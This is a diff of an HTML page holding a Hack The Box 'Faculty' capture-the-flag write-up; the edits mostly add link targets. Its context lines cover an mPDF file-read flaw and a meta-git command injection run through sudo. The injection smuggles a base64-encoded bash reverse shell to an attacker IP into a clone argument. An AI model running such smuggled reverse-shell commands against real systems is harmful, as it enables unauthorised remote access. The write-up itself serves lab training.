@@ -25,7 +25,7 @@
 
 
 
-<link rel="stylesheet" href="/main.95aad797b4ac37875a27d7418e1f17962c12ae6eba2ef3abc677cd14fad7fc5e.css">
+<link rel="stylesheet" href="/main.653e12f307c49620b5b1ba68d8bf5a05c6ab0038af0589bca65686d5dbc02602.css">
 
 
 
@@ -160,7 +160,9 @@ if (!doNotTrack) {
           <img src="https://www.hackthebox.com/storage/avatars/8e579b42d4f769a16ca5dde6feae8df4.png" alt="Faculty Write-Up" />
           
           
-            <figcaption class="center">Machine created by <a href="https://app.hackthebox.com/users/36994">gbyolo</a></figcaption>
+            <figcaption class="center">Machine created by 
+
+<a href="https://app.hackthebox.com/users/36994" target="_blank">gbyolo</a></figcaption>
           
         </figure>
       
@@ -287,11 +289,15 @@ if (!doNotTrack) {
 <h3 id="exporting-pdfs">Exporting PDFs</h3>
 <p>After navigating through the pages, I found that I can export some data as <em>pdf</em>, like the <em>course list</em> and <em>subject list</em>, so I&rsquo;ll try to export them and see if I can get more information from these pdfs.</p>
 <p><img src="viewing_export_pdf_button.png" alt="Export PDF"></p>
-<p>By looking at the <em>URL</em>, it seems that they are using <a href="https://mpdf.github.io/"><em>mPDF</em></a> to generate these pdfs.</p>
+<p>By looking at the <em>URL</em>, it seems that they are using 
+
+<a href="https://mpdf.github.io/" target="_blank"><em>mPDF</em></a> to generate these pdfs.</p>
 <p><img src="seeing_mpdf_in_the_url.png" alt="Noticing MPDF In URL"></p>
 <p>To get more information about which version is used, I can download the pdf and use exiftool on it to see if there is an entry for the version or other useful information.</p>
 <p><img src="download_button_for_pdf.png" alt="Download PDF"></p>
-<p>Using <a href="https://exiftool.org/"><em>exiftool</em></a>:</p>
+<p>Using 
+
+<a href="https://exiftool.org/" target="_blank"><em>exiftool</em></a>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ exiftool OKTLw2f4x5ZgiEUChnypRQ0tWb.pdf 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>ExifTool Version Number         : 12.44
@@ -320,7 +326,11 @@ if (!doNotTrack) {
 <p>Looks like <em>/admin/download.php</em> expects a <em>POST</em> request, having the content of the pdf file to generate in the body of this request <em>URL encoded 2 times then Base64 encoded</em>.</p>
 <p>This opens for me a new attack surface, because now I can try to inject my payloads after encoding it and let <em>mPDF 6.0</em> process it.</p>
 <h3 id="locating-mpdf-lfi-exploit">Locating MPDF LFI Exploit</h3>
-<p>After searching a little bit about mpdf 6.0 exploits, I saw this issue on <a href="https://github.com/mpdf/mpdf/issues/356"><em>github</em></a>. I also found this <a href="https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f"><em>blog</em></a> talking about a very similar approach to the vulnerability.</p>
+<p>After searching a little bit about mpdf 6.0 exploits, I saw this issue on 
+
+<a href="https://github.com/mpdf/mpdf/issues/356" target="_blank"><em>github</em></a>. I also found this 
+
+<a href="https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f" target="_blank"><em>blog</em></a> talking about a very similar approach to the vulnerability.</p>
 <h3 id="exploiting-the-vulnerability">Exploiting the vulnerability</h3>
 <p>A user can include files by injecting html code into a pdf file and thus read arbitrary files from the server, and <em>mPDF 6.0</em> was affected by that. In order to read files, I need to download the pdf and open it with a pdf viewer to be able to click on the annotation marker and read the file&rsquo;s content.</p>
 <p>This is the payload I&rsquo;ll use:</p>
@@ -383,7 +393,13 @@ if (!doNotTrack) {
 <p>If I run <code>sudo -l</code> I get the following result:</p>
 <p><img src="sudo_dash_l.png" alt="sudo -l As gbyolo"></p>
 <p>User gbyolo can run <em>meta-git</em> as developer, howerver this executable is inside <em>/usr/local/bin</em> which means that it was installed manually (wasn&rsquo;t installed using a package manager like <em>apt</em> for example) and there is a big chance that it is out of date and could have some vulnerabilities.</p>
-<p>Searching a little bit on google about meta-git and some possible exploits, I found this <a href="https://hackerone.com/reports/728040"><em>bug report</em></a> on <a href="https://hackerone.com"><em>HackerOne</em></a> which affects every version of <em>meta-git</em> according to <a href="https://security.snyk.io/package/npm/meta-git"><em>snyk</em></a>.</p>
+<p>Searching a little bit on google about meta-git and some possible exploits, I found this 
+
+<a href="https://hackerone.com/reports/728040" target="_blank"><em>bug report</em></a> on 
+
+<a href="https://hackerone.com" target="_blank"><em>HackerOne</em></a> which affects every version of <em>meta-git</em> according to 
+
+<a href="https://security.snyk.io/package/npm/meta-git" target="_blank"><em>snyk</em></a>.</p>
 <p>I can get a reverse shell now as user developer.</p>
 <p><code>sudo -u developer /usr/local/bin/meta-git clone 'sss||echo YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjU5Lzg5ODkgMD4mMQo= | base64 -d | bash'</code></p>
 <p>Howerver I need to be first in a directory writable by developer user, so I will navigate to <em>/tmp/</em>.</p>
